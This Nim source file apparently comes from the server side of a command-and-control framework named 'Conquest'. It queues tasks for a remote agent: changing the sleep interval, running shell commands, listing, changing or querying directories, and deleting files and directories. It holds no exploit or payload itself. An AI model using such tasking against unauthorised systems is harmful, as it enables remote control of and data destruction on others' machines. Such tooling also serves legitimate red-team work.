import nanoid, sequtils, strutils, strformat, terminal, times
import ../types
import ../db/database

# Generic task creation procedure
proc createTask(cq: Conquest, command: TaskCommand, args: seq[string], message: string) =
    let
        date = now().format("dd-MM-yyyy HH:mm:ss")
        task = Task(
            id: generate(alphabet=join(toSeq('A'..'Z'), ""), size=8),
            agent: cq.interactAgent.name,
            command: command,
            args: args,
        )
    
    cq.interactAgent.tasks.add(task)
    cq.writeLine(fgBlack, styleBright, fmt"[{date}] [*] ", resetStyle, message)

# Agent task functions
proc taskExecuteSleep*(cq: Conquest, delay: int) = 
    if delay < 0: 
        cq.writeLine(fgRed, styleBright, "[-] Invalid sleep delay value.")
        return

    # Update 'sleep' value in database 
    if not cq.dbUpdateSleep(cq.interactAgent.name, delay): 
        return

    # Use the generic createTask function
    createTask(cq, Sleep, @[$delay], "Tasked agent to update sleep settings.")

proc taskExecuteShell*(cq: Conquest, arguments: seq[string]) = 
    cq.createTask(ExecuteShell, arguments, "Tasked agent to execute shell command.")

proc taskGetWorkingDirectory*(cq: Conquest) =
    cq.createTask(GetWorkingDirectory, @[], "Tasked agent to get current working directory.")

proc taskSetWorkingDirectory*(cq: Conquest, arguments: seq[string]) =
    cq.createTask(SetWorkingDirectory, arguments, "Tasked agent to change current working directory.")

proc taskListDirectory*(cq: Conquest, arguments: seq[string]) =
    cq.createTask(ListDirectory, arguments, "Tasked agent to list files and directories.")

proc taskRemoveFile*(cq: Conquest, arguments: seq[string]) =
    cq.createTask(RemoveFile, arguments, "Tasked agent to remove file.")

proc taskRemoveDirectory*(cq: Conquest, arguments: seq[string]) =
    cq.createTask(RemoveDirectory, arguments, "Tasked agent to remove directory.")
